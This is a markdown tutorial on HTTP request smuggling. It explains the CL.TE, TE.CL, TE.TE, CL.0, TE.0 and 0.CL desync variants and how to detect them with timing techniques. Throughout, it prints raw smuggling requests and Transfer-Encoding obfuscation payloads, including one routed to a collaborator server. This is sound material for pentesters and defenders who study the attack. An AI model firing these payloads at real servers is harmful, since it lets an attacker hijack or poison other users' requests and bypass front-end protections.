# What is

>This vulnerability occurs when a **desyncronization** between **front-end proxies** and the **back-end** server allows an **attacker** to **send** an HTTP **request** that will be **interpreted** as a **single request** by the **front-end** proxies (load balance/reverse-proxy) and **as 2 request** by the **back-end** server.\
This allows a user to **modify the next request that arrives to the back-end server after his**.

* **Content-Length**

> The Content-Length entity header indicates the size of the entity-body, in bytes, sent to the recipient.

* **Transfer-Encoding: chunked**

> The Transfer-Encoding header specifies the form of encoding used to safely transfer the payload body to the user.\
> Chunked means that large data is sent in a series of chunks

<br>

>[!TIP]
>* NOTE :
>
> When trying to exploit this with Burp Suite **disable `Update Content-Length` and `Normalize HTTP/1 line endings`** in the repeater because some gadgets abuse newlines, carriage returns and malformed content-lengths.

<br>

----
#### CL.TE Vulnerability (Content-Length used by Front-End, Transfer-Encoding used by Back-End)

-   **Front-End (CL):** Processes the request based on the `Content-Length` header.

-   **Back-End (TE):** Processes the request based on the `Transfer-Encoding` header.

-   **Attack Scenario:**

    -   The attacker sends a request where the `Content-Length` header's value does not match the actual content length.

    -   The front-end server forwards the entire request to the back-end, based on the `Content-Length` value.

    -   The back-end server processes the request as chunked due to the `Transfer-Encoding: chunked` header, interpreting the remaining data as a separate, subsequent request.

    -   **Example:**

        ```http
        POST / HTTP/1.1
        Host: vulnerable-website.com
        Content-Length: 30
        Connection: keep-alive
        Transfer-Encoding: chunked

        0

        GET /404 HTTP/1.1
        Foo: x
        ```

####  TE.CL Vulnerability (Transfer-Encoding used by Front-End, Content-Length used by Back-End)

-   **Front-End (TE):** Processes the request based on the `Transfer-Encoding` header.

-   **Back-End (CL):** Processes the request based on the `Content-Length` header.

-   **Attack Scenario:**

    -   The attacker sends a chunked request where the chunk size (`7b`) and actual content length (`Content-Length: 4`) do not align.

    -   The front-end server, honoring `Transfer-Encoding`, forwards the entire request to the back-end.

    -   The back-end server, respecting `Content-Length`, processes only the initial part of the request (`7b` bytes), leaving the rest as part of an unintended subsequent request.

    -   **Example:**

        ```http
        POST / HTTP/1.1
        Host: vulnerable-website.com
        Content-Length: 4
        Connection: keep-alive
        Transfer-Encoding: chunked

        7b
        GET /404 HTTP/1.1
        Host: vulnerable-website.com
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 30

        x=
        0
        ```
        

### TE.TE Vulnerability (Transfer-Encoding used by both, with obfuscation)

-   **Servers:** Both support `Transfer-Encoding`, but one can be tricked into ignoring it via obfuscation.

-   **Attack Scenario:**

    -   The attacker sends a request with obfuscated `Transfer-Encoding` headers.

    -   Depending on which server (front-end or back-end) fails to recognize the obfuscation, a CL.TE or TE.CL vulnerability may be exploited.

    -   The unprocessed part of the request, as seen by one of the servers, becomes part of a subsequent request, leading to smuggling.

    -   **Example:**

        ```http
        POST / HTTP/1.1
        Host: vulnerable-website.com
        Transfer-Encoding: xchunked
        Transfer-Encoding : chunked
        Transfer-Encoding: chunked
        Transfer-Encoding: x
        Transfer-Encoding: chunked
        Transfer-Encoding: x
        Transfer-Encoding:[tab]chunked
        [space]Transfer-Encoding: chunked
        X: X[\n]Transfer-Encoding: chunked

        Transfer-Encoding
        : chunked
        ```

### **CL.CL Scenario (Content-Length used by both Front-End and Back-End)**

-   Both servers process the request based solely on the `Content-Length` header.

-   This scenario typically does not lead to smuggling, as there's alignment in how both servers interpret the request length.

-   **Example:**

    ```http
    POST / HTTP/1.1
    Host: vulnerable-website.com
    Content-Length: 16
    Connection: keep-alive

    Normal Request
    ```

### **CL.0 Scenario**

-   Refers to scenarios where the `Content-Length` header is present and has a value other than zero, indicating that the request body has content. The back-end ignores the `Content-Length` header (which is treated as 0), but the front-end parses it.

-   It's crucial in understanding and crafting smuggling attacks, as it influences how servers determine the end of a request.

-   **Example:**

    ```http
    POST / HTTP/1.1
    Host: vulnerable-website.com
    Content-Length: 16
    Connection: keep-alive

    Non-Empty Body
    ```

### TE.0 Scenario

-   Like the previous one but using TE
-   Technique [reported here](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)
-   **Example**:

```http
OPTIONS / HTTP/1.1
Host: {HOST}
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Transfer-Encoding: chunked
Connection: keep-alive

50
GET <http://our-collaborator-server/> HTTP/1.1
x: X
0
EMPTY_LINE_HERE
EMPTY_LINE_HERE
```

### `0.CL` Scenario

In a `0.CL` sitation a request is send with a Content-Length like:

```http
GET /Logon HTTP/1.1
Host: <redacted>
Content-Length:
 7

GET /404 HTTP/1.1
X: Y
```

And the front-end doesn't take the `Content-Length` into account so it only sends the first request to the backend (until the 7 in the example). However, the backend sees the `Content-Length` and waits for a body that never arrives cause the front-end is already waiting for the response.

However, if there is a request that it's possible to send to the backend that is responded before receiving the body of the request, this deadlock won't occure. In IIS for example this happen sending requests to forbidden words like `/con` (check the [documentation](https://learn.microsoft.com/en-us/windows/win32/fileio/naming-a-file)), this way, the initial request will be responded directly and the second requets will contain the request of the victim like:

```http
GET / HTTP/1.1
X: yGET /victim HTTP/1.1
Host: <redacted>
```

This is useful to cause a desync, but it won't have any impact until now.


### Breaking the web server

This technique is also useful in scenarios where it's possible to **break a web server while reading the initial HTTP data** but **without closing the connection**. This way, the **body** of the HTTP request will be considered the **next HTTP request**.

For example, as explained in [**this writeup**](https://mizu.re/post/twisty-python), In Werkzeug it was possible to send some **Unicode** characters and it will make the server **break**. However, if the HTTP connection was created with the header **`Connection: keep-alive`**, the body of the request won't be read and the connection will still be open, so the **body** of the request will be treated as the **next HTTP request**.

### Forcing via hop-by-hop headers
>Abusing hop-by-hop headers you could indicate the proxy to **delete the header Content-Length or Transfer-Encoding so a HTTP request >smuggling is possible to abuse**.

```http
Connection: Content-Length
```

----------------------------------------------------------------------------------------------------

# Finding HTTP Request Smuggling

>Identifying HTTP request smuggling vulnerabilities can often be achieved using timing techniques, which rely on observing how long it takes for the server to respond to manipulated requests. These techniques are particularly useful for detecting CL.TE and TE.CL vulnerabilities. Besides these methods, there are other strategies and tools that can be used to find such vulnerabilities:

## Finding CL.TE Vulnerabilities Using Timing Techniques :

-   **Method:**

    -   Send a request that, if the application is vulnerable, will cause the back-end server to wait for additional data.

    -   **Example:**

        ```http
        POST / HTTP/1.1
        Host: vulnerable-website.com
        Transfer-Encoding: chunked
        Connection: keep-alive
        Content-Length: 4

        1
        A
        0
        ```

    -   **Observation:**

        -   The front-end server processes the request based on `Content-Length` and cuts off the message prematurely.
        -   The back-end server, expecting a chunked message, waits for the next chunk that never arrives, causing a delay.
-   **Indicators:**

    -   Timeouts or long delays in response.
    -   Receiving a 400 Bad Request error from the back-end server, sometimes with detailed server information.

## Finding TE.CL Vulnerabilities Using Timing Techniques :

-   **Method:**

    -   Send a request that, if the application is vulnerable, will cause the back-end server to wait for additional data.

    -   **Example:**

        ```http
        POST / HTTP/1.1
        Host: vulnerable-website.com
        Transfer-Encoding: chunked
        Connection: keep-alive
        Content-Length: 6

        0
        X
        ```

    -   **Observation:**

        -   The front-end server processes the request based on `Transfer-Encoding` and forwards the entire message.
        -   The back-end server, expecting a message based on `Content-Length`, waits for additional data that never arrives, causing a delay.
---------------------------------------------------------

## Other Methods to Find Vulnerabilities :

-   **Differential Response Analysis:**
    -   Send slightly varied versions of a request and observe if the server responses differ in an unexpected way, indicating a parsing discrepancy.
-   **Using Automated Tools:**
    -   Tools like Burp Suite's 'HTTP Request Smuggler' extension can automatically test for these vulnerabilities by sending various forms of ambiguous requests and analyzing the responses.
-   **Content-Length Variance Tests:**
    -   Send requests with varying `Content-Length` values that are not aligned with the actual content length and observe how the server handles such mismatches.
-   **Transfer-Encoding Variance Tests:**
    -   Send requests with obfuscated or malformed `Transfer-Encoding` headers and monitor how differently the front-end and back-end servers respond to such manipulations.

 
